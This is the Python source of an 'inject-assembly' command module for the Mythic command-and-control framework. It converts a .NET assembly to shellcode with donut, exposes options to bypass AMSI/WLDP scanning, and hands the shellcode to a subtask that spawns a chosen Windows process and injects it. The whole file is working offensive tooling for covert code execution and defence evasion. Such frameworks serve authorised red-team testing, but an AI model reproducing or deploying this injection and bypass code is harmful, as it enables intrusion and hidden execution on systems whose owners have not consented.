from mythic_container.MythicCommandBase import *  # import the basics
import json  # import any other code you might need
# import the code for interacting with Files on the Mythic server
from mythic_container.MythicRPC import *
import donut
import tempfile
import base64
import os

# create a class that extends TaskArguments class that will supply all the arguments needed for this command
class InjectAssemblyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line)
        # this is the part where you'd add in your additional tasking parameters
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="The assembly to inject",
                parameter_group_info=[ParameterGroupInfo(ui_position=1)],
            ),
            CommandParameter(
                name="arch",
                type=ParameterType.Number,
                description="Target architecture for loader : 1=x86, 2=amd64, 3=x86+amd64 (default)",
                default_value=3,
                parameter_group_info=[
                    ParameterGroupInfo(required=False)
                ],
            ),
            CommandParameter(
                name="bypass",
                type=ParameterType.Number,
                description="Behavior for bypassing AMSI/WLDP : 1=None, 2=Abort on fail, 3=Continue on fail (default)",
                default_value=3,
                parameter_group_info=[
                    ParameterGroupInfo(required=False)
                ],
            ),
            CommandParameter(
                name="exit_opt",
                type=ParameterType.Number,
                description="Determines how the loader should exit. 1=exit thread, 2=exit process (default), 3=Do not exit or cleanup and block indefinitely",
                default_value = 2,
                parameter_group_info=[
                    ParameterGroupInfo(required=False)
                ],
            ),
            CommandParameter(
                name="processName",
                type=ParameterType.String,
                description = "The process to spawn and inject into",
                parameter_group_info=[ParameterGroupInfo(ui_position=2)],
            ),
            CommandParameter(
                name="arguments",
                type=ParameterType.String,
                description = "Arguments that are passed to the assembly",
                default_value = "",
                parameter_group_info=[
                    ParameterGroupInfo(required=False)
                ],
            ),
        ]

    # you must implement this function so that you can parse out user typed input into your paramters or load your parameters based on some JSON input
    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)


# this is information about the command itself
class InjectAssemblyCommand(CommandBase):
    cmd = "inject-assembly"
    needs_admin = False
    script_only = True
    help_cmd = "inject-assembly"
    description = "Use donut to convert a .NET assembly into shellcode and execute the buffer in a remote process"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = ""
    argument_class = InjectAssemblyArguments
    attackmapping = []
    browser_script = None
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=False
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        #Get original file info
        fData = FileData()
        fData.AgentFileId = task.args.get_arg("file")
        file_rpc = await SendMythicRPCFileGetContent(fData)
        
        if not file_rpc.Success:
            raise Exception("Failed to get file contents: " + file_rpc.Error)

        #Create a temporary file
        tempDir = tempfile.TemporaryDirectory()

        with open(os.path.join(tempDir.name, "assembly.exe"), "wb") as file:
            file.write(file_rpc.Content)

        shellcode = donut.create(
            file=os.path.join(tempDir.name, "assembly.exe"),
            arch=task.args.get_arg("arch"),
            bypass=task.args.get_arg("bypass"),
            params = task.args.get_arg("arguments"),
            exit_opt = task.args.get_arg("exit_opt"),
        )

        fileCreate = MythicRPCFileCreateMessage(task.id, DeleteAfterFetch = True, FileContents = shellcode, Filename = "shellcode.bin")

        shellcodeFile = await SendMythicRPCFileCreate(fileCreate)

        if not shellcodeFile.Success:
            raise Exception("Failed to create file: " + shellcodeFile.Error)

        createSubtaskMessage = MythicRPCTaskCreateSubtaskMessage(task.id, 
                                                                 CommandName="shellcode-inject", 
                                                                 Params=json.dumps(
                                                                    {"file": shellcodeFile.AgentFileId, 
                                                                     "processName": task.args.get_arg("processName")}), 
                                                                 Token=task.token)

        subtask = await SendMythicRPCTaskCreateSubtask(createSubtaskMessage)

        if not subtask.Success:
            raise Exception("Failed to create subtask: " + subtask.Error)
        
        return task

    async def process_response(self, response: AgentResponse):
        pass

